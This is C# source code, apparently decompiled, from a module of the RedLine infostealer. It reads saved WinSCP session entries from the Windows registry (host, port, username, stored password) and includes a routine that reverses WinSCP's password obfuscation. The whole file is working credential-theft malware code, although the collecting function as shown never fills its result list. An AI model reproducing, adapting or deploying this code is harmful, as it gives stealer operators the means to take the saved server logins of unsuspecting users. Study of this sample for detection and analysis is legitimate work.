using Microsoft.Win32;
using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace RedLine.Logic.FtpClients
{
  public static class WinSCP
  {
    public static List<LoginPair> ParseConnections()
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        using (RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
        {
          if (registryKey1 != null)
          {
            foreach (string subKeyName in registryKey1.GetSubKeyNames())
            {
              string name = Path.Combine("Software\\Martin Prikryl\\WinSCP 2\\Sessions", subKeyName);
              using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name))
              {
                if (registryKey2 != null)
                {
                  string host = registryKey2.GetValue("HostName")?.ToString();
                  if (!string.IsNullOrWhiteSpace(host))
                  {
                    WinSCP.DecryptPassword(registryKey2.GetValue("UserName")?.ToString(), registryKey2.GetValue("Password")?.ToString(), host);
                    string str = host + ":" + registryKey2.GetValue("PortNumber")?.ToString();
                  }
                }
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      return loginPairList;
    }

    private static int DecodeNextChar(List<string> list)
    {
      return (int) byte.MaxValue ^ ((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 163) & (int) byte.MaxValue;
    }

    private static string DecryptPassword(string user, string pass, string host)
    {
      try
      {
        if (user == string.Empty || pass == string.Empty || host == string.Empty)
          return "";
        List<string> list1 = pass.Select<char, string>((Func<char, string>) (keyf => keyf.ToString())).ToList<string>();
        List<string> stringList1 = new List<string>();
        for (int index = 0; index < list1.Count; ++index)
        {
          if (list1[index] == "A")
            stringList1.Add("10");
          if (list1[index] == "B")
            stringList1.Add("11");
          if (list1[index] == "C")
            stringList1.Add("12");
          if (list1[index] == "D")
            stringList1.Add("13");
          if (list1[index] == "E")
            stringList1.Add("14");
          if (list1[index] == "F")
            stringList1.Add("15");
          if ("ABCDEF".IndexOf(list1[index]) == -1)
            stringList1.Add(list1[index]);
        }
        List<string> list2 = stringList1;
        int num1 = 0;
        if (WinSCP.DecodeNextChar(list2) == (int) byte.MaxValue)
          num1 = WinSCP.DecodeNextChar(list2);
        list2.Remove(list2[0]);
        list2.Remove(list2[0]);
        list2.Remove(list2[0]);
        list2.Remove(list2[0]);
        int num2 = WinSCP.DecodeNextChar(list2);
        List<string> stringList2 = list2;
        stringList2.Remove(stringList2[0]);
        stringList2.Remove(stringList2[0]);
        int num3 = WinSCP.DecodeNextChar(list2) * 2;
        for (int index = 0; index < num3; ++index)
          list2.Remove(list2[0]);
        string str1 = "";
        for (int index = -1; index < num2; ++index)
        {
          string str2 = ((char) WinSCP.DecodeNextChar(list2)).ToString();
          list2.Remove(list2[0]);
          list2.Remove(list2[0]);
          str1 += str2;
        }
        string oldValue = user + host;
        int count = str1.IndexOf(oldValue, StringComparison.Ordinal);
        return str1.Remove(0, count).Replace(oldValue, "");
      }
      catch
      {
        return "";
      }
    }
  }
}
